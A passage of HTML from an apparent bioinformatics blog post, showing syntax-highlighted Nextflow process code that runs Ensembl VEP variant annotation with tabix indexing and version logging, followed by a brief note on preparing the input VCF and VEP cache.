class="token string variable" style="color:hsl(221, 87%, 60%)">115.2--90ec797ecb088e9a'}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">custom_extra_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val genome</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val species</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    val cache_version</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path cache</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fasta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path extra_files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.vcf.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, emit: vcf, optional: </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.vcf.gz.tbi"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, emit: tbi, optional: </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.tab.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, emit: tab, optional: </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.json.gz"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">, emit: json, optional: </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.html"</span><span class="token plain">, emit: report, optional: </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path </span><span class="token string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">, emit: versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    when:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task.ext.when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task.ext.when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.args ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def args2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.args2 ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def file_extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--vcf"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'vcf'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--json"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'json'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--tab"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'tab'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'vcf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def compress_cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--compress_output"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--compress_output bgzip'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def dir_cache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> cache ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token string variable environment constant" style="color:hsl(35, 99%, 36%)">PWD</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${cache}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/.vep"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def reference </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> fasta ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--fasta </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${fasta}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def create_index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> file_extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"vcf"</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"tabix </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${args2}</span><span class="token string" style="color:hsl(119, 34%, 47%)"> </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${file_extension}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.gz"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    vep </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${vcf}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${file_extension}</span><span class="token plain">.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${args}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${compress_cmd}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${reference}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--assembly</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${genome}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--species</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${species}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cache</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--cache_version</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${cache_version}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--dir_cache</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${dir_cache}</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--fork</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${task.cpus}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${create_index}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ensemblvep: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">vep </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'s/^.*Versions:.*ensembl-vep : //;s/ .*\$//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        tabix: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">tabix </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-h</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'s/^.*Version: //; s/ .*\$//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task.ext.prefix ?: </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${meta.id}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def file_extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--vcf"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'vcf'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--json"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'json'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> args.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"--tab"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'tab'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'vcf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    def create_index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> file_extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"vcf"</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">"touch </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${file_extension}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.gz.tbi"</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">gzip</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${file_extension}</span><span class="token plain">.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${create_index}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token plain">_summary.html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;-</span><span class="token plain">END_VERSIONS </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${task.process}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ensemblvep: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">vep </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'s/^.*Versions:.*ensembl-vep : //;s/ .*\$//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        tabix: </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">tabix </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-h</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">sed</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">'s/^.*Version: //; s/ .*\$//'</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>Their solution is showed below
<img decoding="async" loading="lazy" alt="solution" src="https://riverxdata.github.io/river-docs/assets/images/variant_annotation_aws-15d43bdb7357f6f01ab875ad3c907ba6.png" width="1024" height="811" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="inputs">Inputs<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#inputs" class="hash-link" aria-label="Direct link to Inputs" title="Direct link to Inputs" translate="no">​</a></h3>
<p>The vcf file is prepared on the <code>inputs</code> folder, while the vep cache database (25.GB) can be prepared as below on Makefile.</p>
